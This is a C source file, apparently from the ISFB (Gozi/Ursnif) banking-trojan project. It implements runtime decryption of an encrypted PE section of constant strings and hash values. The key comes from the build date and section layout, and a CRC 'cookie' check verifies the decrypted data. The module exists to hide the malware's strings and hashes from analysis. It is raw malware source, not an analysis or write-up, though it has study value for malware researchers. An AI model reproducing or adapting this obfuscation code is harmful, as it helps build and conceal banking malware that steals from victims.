//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: cschar.c
// $Revision: 454 $
// $Date: 2015-01-24 19:31:49 +0300 (Сб, 24 янв 2015) $
// description:
//	Defines constant char sequences allocated within a separate PE-section

#include "common.h"
#include "..\crypto\crypto.h"


// The following variable is used to hide predefined hash values stored within a module.
// We initially define all hashes xored with CS_COOKIE. On the startup we calculate g_CsCookie variable wich has to be equal to CS_COOKIE and
//	then use g_CsCookie to modify hash values before comparing them.
 ULONG	g_CsCookie = 0;


ULONG __stdcall CsGetKey(VOID)
{
	CHAR	Time[] = __DATE__;
	PULONG	puTime = (PULONG)&Time;

	return(puTime[0] ^ puTime[1]);
}


WINERROR	CsDecryptSection(
	HMODULE	hModule,
	ULONG	Seed
	)
{
	WINERROR Status = NO_ERROR;

#ifdef _CS_ENCRYPT_STRINGS
	PIMAGE_SECTION_HEADER	pSection;
	SECTION_NAME	SecName = {0};

	lstrcpyn((LPTSTR)&SecName.Byte, CS_NEW_SECTION_NAME, sizeof(SECTION_NAME));

	if (pSection = PeSupFindSectionByName((PCHAR)hModule, &SecName))
	{
		if (pSection->VirtualAddress && pSection->SizeOfRawData)
		{
			// Calculating a Key value depending on the section RVA and size
			ULONG	Key = (CsGetKey() ^ (pSection->VirtualAddress + pSection->SizeOfRawData)) + Seed;

			// Decrypting the section
			XorDecryptBuffer((PCHAR)hModule + pSection->VirtualAddress, pSection->SizeOfRawData, Key, TRUE);

			// Calculating g_CsCookie variable from the decrypted data. It has to be equal to CS_COOKIE value or nothing is gonna work.
			g_CsCookie = Crc32(szDataRegSubkey, cstrlenA(szDataRegSubkey));

			// Verifying the decrypted data
			if (g_CsCookie != CS_COOKIE)
			{
				XorEncryptBuffer((PCHAR)hModule + pSection->VirtualAddress, pSection->SizeOfRawData, Key, TRUE);
				Status = ERROR_BADKEY;
			}
		}
		else
			Status = ERROR_BAD_EXE_FORMAT;
	}	// if (pSection = PeSupFindSectionByName((PCHAR)hModule, &SecName))
	else
		Status = ERROR_FILE_NOT_FOUND;
#else	// _CS_ENCRYPT_STRINGS
	g_CsCookie = CS_COOKIE;
#endif

	return(Status);
}
